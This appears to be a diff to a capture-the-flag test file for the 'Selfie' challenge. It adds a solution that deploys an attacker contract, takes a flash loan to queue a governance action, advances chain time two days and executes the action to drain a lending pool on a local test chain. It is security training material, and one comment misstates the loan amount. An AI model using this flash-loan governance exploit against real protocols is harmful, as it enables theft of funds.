@@ -39,6 +39,19 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('SelfieAttacker', player))
+            .deploy(pool.address, governance.address, token.address, player.address);
+
+        // Loan at least 1.5M / 2 to queue an action. So call the Loan with 1M as amount
+        await attacker.callLoan(1500000n * 10n ** 18n);
+
+        // Advance time 2 days so that we can call the queued action
+        await ethers.provider.send("evm_increaseTime", [2 * 24 *60 * 60]); // 2 days
+
+        const actionID = await attacker.actionID();
+
+        await (await governance).connect(player).executeAction(actionID);
+
     });
 
     after(async function () {
